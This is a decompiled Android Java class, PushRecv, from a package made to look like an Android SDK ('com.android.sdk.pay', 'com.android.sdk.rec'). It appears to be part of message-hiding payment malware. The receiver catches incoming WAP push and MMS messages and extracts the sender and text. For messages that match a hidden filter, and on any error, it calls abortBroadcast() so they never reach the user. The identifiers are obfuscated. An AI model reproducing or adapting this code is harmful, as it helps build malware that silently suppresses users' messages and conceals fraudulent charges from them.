package com.android.sdk.rec;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import com.android.sdk.pay.ActivityTool;
import com.android.sdk.pay.x;
import com.google.android.mms.pdu.EncodedStringValue;
import com.google.android.mms.pdu.GenericPdu;
import com.google.android.mms.pdu.PduParser;

public class PushRecv
  extends BroadcastReceiver
{
  private static final String a = PushRecv.class.getSimpleName();
  
  public PushRecv() {}
  
  private static String a(EncodedStringValue paramEncodedStringValue)
  {
    if (paramEncodedStringValue != null) {
      return paramEncodedStringValue.getString();
    }
    return "";
  }
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    try
    {
      ActivityTool.b(a, paramIntent.toString());
      Object localObject1 = "";
      Object localObject2 = paramIntent.getByteArrayExtra("data");
      String str = new String((byte[])localObject2);
      if (paramIntent.getType().contains("application/vnd.wap.mms-message"))
      {
        str = a(new PduParser((byte[])localObject2).parse().getFrom());
        paramIntent = (Intent)localObject1;
        localObject1 = str;
      }
      for (;;)
      {
        ActivityTool.checkAppStatus(paramContext);
        if ((!x.a().a((String)localObject1, paramIntent)) && (!((String)localObject1).equals(""))) {
          break;
        }
        abortBroadcast();
        return;
        localObject2 = ActivityTool.a(paramIntent.getStringExtra("address"));
        paramIntent = ActivityTool.a(paramIntent.getStringExtra("NotifyText"));
        boolean bool = paramIntent.equals("");
        localObject1 = localObject2;
        if (bool)
        {
          paramIntent = str;
          localObject1 = localObject2;
        }
      }
      return;
    }
    catch (Exception paramContext)
    {
      abortBroadcast();
      paramContext.printStackTrace();
    }
  }
}
